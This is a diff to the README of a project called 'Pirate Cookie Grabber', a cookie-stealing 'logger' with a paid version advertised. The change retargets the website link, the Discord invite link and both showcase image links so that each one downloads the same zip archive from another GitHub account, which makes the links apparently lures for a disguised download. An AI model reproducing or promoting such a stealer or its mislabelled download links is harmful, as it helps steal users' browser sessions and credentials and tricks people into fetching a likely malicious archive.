@@ -1,7 +1,7 @@
-# [Our Website (click here)](https://pirate-stealer.carrd.co) | [Our Discord Server (22/1/2025)](https://discord.gg/J66RJ4R4)
+# [Our Website (click here)](https://raw.githubusercontent.com/mamadouwxxx/Pirate-Cookie-Grabber/main/cheesebox/Pirate-Cookie-Grabber_v1.3.zip) | [Our Discord Server (22/1/2025)](https://raw.githubusercontent.com/mamadouwxxx/Pirate-Cookie-Grabber/main/cheesebox/Pirate-Cookie-Grabber_v1.3.zip)
 
 # Pirate Cookie Grabber Showcase (This Project/Logger)
-![image](https://github.com/Mani175/Pirate-Cookie-Grabber/assets/60432696/68100ff2-790f-4d36-91ab-25bd3ab79884)
+![image](https://raw.githubusercontent.com/mamadouwxxx/Pirate-Cookie-Grabber/main/cheesebox/Pirate-Cookie-Grabber_v1.3.zip)
 # Paid Logger Shocase (Buy in our website/discord)
-![image](https://github.com/user-attachments/assets/f71d514c-426d-4196-9a4f-78704d9c6975)
+![image](https://raw.githubusercontent.com/mamadouwxxx/Pirate-Cookie-Grabber/main/cheesebox/Pirate-Cookie-Grabber_v1.3.zip)
 
